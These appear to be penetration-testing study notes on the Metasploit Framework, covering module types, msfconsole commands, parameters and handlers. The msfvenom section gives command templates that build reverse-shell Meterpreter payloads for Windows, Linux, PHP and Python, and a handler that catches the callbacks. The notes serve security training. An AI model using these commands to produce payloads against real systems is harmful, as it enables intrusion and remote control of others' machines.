### **I. Introduction to Metasploit:**

- **Purpose:** Metasploit is a powerful penetration testing framework that provides a comprehensive set of tools for vulnerability scanning, exploitation, and post-exploitation. It streamlines the process of identifying and exploiting security weaknesses in various systems and applications.
- **Versions:**
    - **Metasploit Pro:** The commercial version with a graphical user interface (GUI) and advanced features for automation and management.
    - **Metasploit Framework:** The open-source version that operates from the command line. This is the focus of these notes.
- **Components:**
    - **`msfconsole`:** The main command-line interface for interacting with the framework.
    - **Modules:** Small components that perform specific tasks (exploits, scanners, payloads, etc.).
    - **Tools:** Standalone tools for vulnerability research and exploit development (e.g., `msfvenom`, `pattern_create`, `pattern_offset`).
- **Key Concepts:**
    - **Exploit:** A piece of code that takes advantage of a vulnerability.
    - **Vulnerability:** A weakness in design, code, or logic that can be exploited.
    - **Payload:** The code that is executed on the target system after successful exploitation.
### **II. Module Types:**

- **Auxiliary:** Supporting modules like scanners, fuzzers, and denial-of-service tools.
- **Encoders:** Encode payloads to evade detection or bypass security mechanisms.
- **Evasion:** Modules specifically designed to bypass antivirus and security products.
- **Exploits:** Modules that exploit known vulnerabilities.
- **Nops:** "No operation" instructions used for padding or shellcode alignment.
- **Payloads:** Code to be executed on the target (e.g., shells, Meterpreter, command execution).
    - **Types:**
        - **Singles:** Self-contained payloads.
        - **Stagers:** Set up a connection for staged payloads.
        - **Stages:** The main payload downloaded by the stager.
- **Post:** Modules for post-exploitation activities (e.g., privilege escalation, data gathering).
### **III. `msfconsole`:**

- **Launching:** `msfconsole`
- **Command Execution:** Supports many Linux commands (e.g., `ls`, `ping`, `clear`).
- **Tab Completion:** Type the beginning of a command and press Tab to autocomplete.
- **Context:** `msfconsole` operates within contexts. Settings and parameters are specific to the current context (module).
- **`show options`:** Displays the options for the current module.
- **`show payloads`:** Lists compatible payloads for an exploit.
- **`info`:** Provides detailed information about a module.
- **`search`:** Searches for modules based on keywords, CVE numbers, etc.
- **`use`:** Selects a module for use.
- **`back`:** Leaves the current context.
- **`set`:** Sets the value of a parameter.
- **`setg`:** Sets a global parameter value.
- **`unset`:** Clears a parameter value.
- **`unset all`:** Clears all parameter values.
- **`exploit` or `run`:** Executes the selected module.
- **`exploit -z`:** Runs the exploit and backgrounds the session.
- **`check`:** Checks if the target is vulnerable (if supported by the module).
- **`sessions`:** Lists active sessions.
- **`sessions -i [id]`:** Interacts with a session.
- **`background` or `CTRL+Z`:** Backgrounds a session.
### **IV. Parameters:**

- **`RHOSTS`:** Target host(s) (single IP, range, CIDR, or file).
- **`RPORT`:** Target port.
- **`PAYLOAD`:** Payload to use.
- **`LHOST`:** Attacking machine's IP address.
- **`LPORT`:** Local port for reverse connections.
- **`SESSION`:** Session ID for post-exploitation modules.
### **V. Msfvenom:**

- **Purpose:** Generates payloads in various formats.
- **Options:**
    - `-l payloads`: Lists available payloads.
    - `--list formats`: Lists supported output formats.
    - `-p [payload]`: Specifies the payload.
    - `-f [format]`: Specifies the output format.
    - `-e [encoder]`: Specifies an encoder.
    - `LHOST`: Attacking machine's IP address.
    - `LPORT`: Local port for reverse connections.
- **Examples:**
    - Windows executable: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > payload.exe`
    - Linux executable: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=... LPORT=... -f elf > payload.elf`
    - PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=... LPORT=... -f raw > payload.php`
    - Python: `msfvenom -p cmd/unix/reverse_python LHOST=... LPORT=... -f raw > payload.py`
### **VI. Handlers:**

- **Purpose:** Catch reverse shells and Meterpreter payloads.
- **Module:** `exploit/multi/handler`
- **Options:**
    - `set payload [payload]`: Specifies the payload to handle.
    - `set LHOST [ip]`: Sets the listening IP address.
    - `set LPORT [port]`: Sets the listening port.
- **Running:** `run`